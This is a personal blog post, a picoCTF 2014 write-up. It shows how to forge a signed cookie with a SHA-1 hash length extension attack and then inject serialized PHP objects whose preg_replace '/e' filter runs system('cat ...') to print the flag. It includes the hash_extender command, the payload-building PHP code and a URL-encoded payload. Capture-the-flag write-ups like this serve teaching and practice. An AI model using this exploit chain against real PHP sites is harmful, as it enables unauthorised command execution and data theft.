<!doctype html>
<html lang="en" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">picoCTF 2014 part 3: Steve&#x27;s List | Clifford Ressel</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://clifford.ressel.fyi/img/large-profpic-sm.png"><meta data-rh="true" name="twitter:image" content="https://clifford.ressel.fyi/img/large-profpic-sm.png"><meta data-rh="true" property="og:url" content="https://clifford.ressel.fyi/blog/picoctf-2014-part3"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="picoCTF 2014 part 3: Steve&#x27;s List | Clifford Ressel"><meta data-rh="true" name="description" content="Summary"><meta data-rh="true" property="og:description" content="Summary"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2014-12-01T00:00:00.000Z"><meta data-rh="true" property="article:author" content="https://github.com/CSRessel"><link data-rh="true" rel="canonical" href="https://clifford.ressel.fyi/blog/picoctf-2014-part3"><link data-rh="true" rel="alternate" href="https://clifford.ressel.fyi/blog/picoctf-2014-part3" hreflang="en"><link data-rh="true" rel="alternate" href="https://clifford.ressel.fyi/blog/picoctf-2014-part3" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","@id":"https://clifford.ressel.fyi/blog/picoctf-2014-part3","mainEntityOfPage":"https://clifford.ressel.fyi/blog/picoctf-2014-part3","url":"https://clifford.ressel.fyi/blog/picoctf-2014-part3","headline":"picoCTF 2014 part 3: Steve's List","name":"picoCTF 2014 part 3: Steve's List","description":"Summary","datePublished":"2014-12-01T00:00:00.000Z","author":{"@type":"Person","name":"Clifford","url":"https://github.com/CSRessel","image":"/img/csressel-xs.webp"},"keywords":[],"isPartOf":{"@type":"Blog","@id":"https://clifford.ressel.fyi/blog","name":"Blog"}}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Clifford Ressel RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Clifford Ressel Atom Feed"><link rel="stylesheet" href="/assets/css/styles.737d29ef.css">
<script src="/assets/js/runtime~main.98bd39d5.js" defer="defer"></script>
<script src="/assets/js/main.8323aee2.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="dark";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/halfbg-profpic-sm.png" alt="" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/halfbg-profpic-sm.png" alt="" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Clifford Ressel</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/CSRessel" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/eink-tablet-part1">E Ink tablets: Rooting a Boox Go 10.3</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/rps-consequentialism">Rock paper scissors consequentialism</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/python-generators-part2">Learning generators part 2: In depth</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2023</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/python-generators-part1">Learning generators part 1: Basics</a></li></ul></div></nav></aside><main class="col col--7"><article class=""><header><h1 class="title_f1Hy">picoCTF 2014 part 3: Steve&#x27;s List</h1><div class="container_mt6G margin-vert--md"><time datetime="2014-12-01T00:00:00.000Z">December 1, 2014</time> · <!-- -->5 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--12 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/CSRessel" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo authorImage_XqGP" src="/img/csressel-xs.webp" alt="Clifford"></a><div class="avatar__intro authorDetails_lV9A"><div class="avatar__name"><a href="https://github.com/CSRessel" target="_blank" rel="noopener noreferrer"><span class="authorName_yefp">Clifford</span></a></div><div class="authorSocials_rSDt"></div></div></div></div></div></header><div id="__blog-post-container" class="markdown"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
<p>Hash extension allows us to enter whatever cookies we choose, without knowledge of the secret, and still pass the website’s checks. Since the cookie is unserialized, we can inject arbitrary php objects into the server. By injecting a Post object, we know it’s destroy method will be called. This method has been redefined to output the Post’s fields in HTML comments after parsing them with the class Filter. The Filter operates by running the given text through preg_replace calls with stored params for match and substitution. As we have injected the object, we have complete control over these stored params, and can thus call the preg_replace with the ‘e’ flag, allowing us to do arbitrary command execution. By catting the necessary file at <code>/home/daedalus/flag.txt</code>, and substituting all of the Post’s text with the file’s contents, we can print the file’s contents in an HTML comment, and thus get the flag.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-hash-extension">The Hash Extension<a href="#the-hash-extension" class="hash-link" aria-label="Direct link to The Hash Extension" title="Direct link to The Hash Extension">​</a></h2>
<p>Examination of the hacked website shows the only possible input is through the cookies.
However, any attempts to manipulate the cooke result in us being locked out of the website.</p>
<p>Examination of the website source makes it quickly apparent why:</p>
<div class="language-PHP language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$custom_settings = urldecode($_COOKIE[&#x27;custom_settings&#x27;]);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$hash = sha1(AUTH_SECRET . $custom_settings);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">if ($hash !== $_COOKIE[&#x27;custom_settings_hash&#x27;]) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  die(&quot;Why would you hack Section Chief Steve&#x27;s site? :(&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>The cookie <code>custom_settings</code> will later be deserialized, and will be the site of our object inject. However, <code>custom_settings_hash</code> will need to change in a similar manner.</p>
<p>To not fail the validation, <code>custom_settings_hash</code> needs to be of the form <code>sha1(AUTH_SECRET . urldecode($_COOKIE[&#x27;custom_settings&#x27;]))</code> where <code>AUTH_SECRET</code> is an unknown, eight letter secret.
As we do not have access to <code>AUTH_SECRET</code>, it would appear that we are unable to change the <code>custom_settings</code> cookie.</p>
<p>However, using a hash extension attack, we can change the value of <code>custom_settings_hash</code> to correspond to our new value of <code>custom_settings</code> without knowledge of the <code>AUTH_SECRET</code>.</p>
<p>The tool to be used is called <a href="https://github.com/iagox86/hash_extender">hash extender</a>. By downloading and compiling the program, we can generate the new value of <code>custom_settings_hash</code> with the following command:</p>
<div class="language-Shell language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ./hash_extender --data d --secret 8 --append a --signature s --format sha1 --table</span><br></span></code></pre></div></div>
<p>where <code>d</code> is the previous <code>custom_settings</code>, <code>a</code> is the addition to the <code>custom_settings</code> (or the object injection), and s is the previous value of <code>custom_settings_hash</code>.</p>
<p>With this value, we can now manipulate <code>custom_settings</code> without tripping Steve’s rudimentary IPS.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-object-injection">The Object Injection<a href="#the-object-injection" class="hash-link" aria-label="Direct link to The Object Injection" title="Direct link to The Object Injection">​</a></h2>
<p>There are several important items to notice while reading the source of the website.</p>
<ol>
<li>Whatever is in the <code>custom_settings</code> cookie will be unserialized. Specifically, the contents will be split on newlines, and each section will be individually unserialized.</li>
<li>In the <code>classes.php</code> file, the Post’s <code>__destruct()</code> method is redefined. It now is intended to output the Post’s fields in comments, as “debugging stuff.”</li>
<li>The Filter class used by the Post’s <code>__destruct()</code> method uses the <code>preg_replace()</code> method with class fields as arguments.</li>
</ol>
<p>These three facts, taken together, allow us to do arbitrary command execution with viewing of output by injecting objects into the <code>custom_settings</code> cookie.</p>
<p>The necessary object to cat the flag from <code>/home/daedalus/flag.txt</code> will look something like this in PHP:</p>
<div class="language-PHP language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$filter_set = [</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		new Filter(&#x27;/.*/e&#x27;, &#x27;system(&quot;cat /home/daedalus/flag.txt&quot;)&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	];</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$obj = serialize(true) . &quot;\n&quot; . serialize(new Post(</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	&quot;the flag is&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	&quot;fail&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	$filter_set));</span><br></span></code></pre></div></div>
<p>The Filter uses the “e” flag on the <code>preg_replace()</code> call. This will run the replacement argument as PHP code and replace the matching text with the output.</p>
<p>By having out only filter match everything, and run the command <code>$ cat /home/daedalus/flag.txt</code>, we will replace the body of the Post we inject with the flag.</p>
<p>Outputting this serialized object to a file, and inputting that file to the hash_extender command discussed above, we can generate the new value of <code>custom_settings_hash</code>. It is important to note, using a file is the best way to go about this part of the problem; before the object is urlencoded, it will have nonprinting characters which you will not be able to copy and paste.</p>
<p>Finally, by replacing <code>custom_settings</code> with a urlencoding of the serialized object, and <code>custom_settings_hash</code> with the new signature, we will see the flag in the comments of the site:</p>
<p>D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve</p>
<hr>
<p>Note: the payload for <code>custom_settings</code> will look something like:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">b%253A1%253B%250AO%253A4%253A%2522Post%2522%253A3%253A%257Bs%253A8%253A%2522%2500%252A%2500title%2522%253Bs%253A11%253A%2522the%2Bflag%2Bis%2522%253Bs%253A7%253A%2522%2500%252A%2500text%2522%253Bs%253A4%253A%2522fail%2522%253Bs%253A10%253A%2522%2500%252A%2500filters%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A6%253A%2522Filter%2522%253A2%253A%257Bs%253A10%253A%2522%2500%252A%2500pattern%2522%253Bs%253A5%253A%2522%252F.%252A%252Fe%2522%253Bs%253A7%253A%2522%2500%252A%2500repl%2522%253Bs%253A37%253A%2522system%2528%2522cat%2B%252Fhome%252Fdaedalus%252Fflag.txt%2522%2529%2522%253B%257D%257D%257D</span><br></span></code></pre></div></div>
<p>However, I do not believe this is perfectly accurate as I recall making changes out of file that were never duplicated in my backup of the payload. Because of this, I have not included the payload or its signature in this writeup.</p></div></article><br><hr><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/blog/many-minutes-few-moments"><div class="pagination-nav__sublabel">Newer post</div><div class="pagination-nav__label">10 minute moments</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/blog/picoctf-2014-part2"><div class="pagination-nav__sublabel">Older post</div><div class="pagination-nav__label">picoCTF 2014 part 2: secure_page_service</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#summary" class="table-of-contents__link toc-highlight">Summary</a></li><li><a href="#the-hash-extension" class="table-of-contents__link toc-highlight">The Hash Extension</a></li><li><a href="#the-object-injection" class="table-of-contents__link toc-highlight">The Object Injection</a></li></ul></div></div></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__links text--center"><div class="footer__links"><span class="footer__link-item"><div class="footer__title">Find Me Elsewhere</div><span class="footer__link-separator">·</span><a href="https://github.com/CSRessel" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><span class="footer__link-separator">·</span><a href="https://www.instagram.com/cliffroared/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Instagram<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><span class="footer__link-separator">·</span><a href="https://www.youtube.com/@cliffroared" target="_blank" rel="noopener noreferrer" class="footer__link-item">YouTube<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></span></div></div><div class="footer__bottom text--center"><div class="footer__copyright">© 2025, Clifford Ressel. Content is <a href="https://creativecommons.org/licenses/by-sa/4.0/" target="_blank">CC BY-SA 4.0 License</a>, except code which is <a href="https://mit-license.org/" target="_blank">MIT License</a>. Last published October 2025. Built with <a href="https://docusaurus.io/" target="_blank">Docusaurus <img height="16px" width="16px" src="/img/docusaurus-xs.png" alt="The docusaurus logo, a cartoon graphic of a green smiling dinosaur"></a></div></div></div></footer></div>
</body>
</html>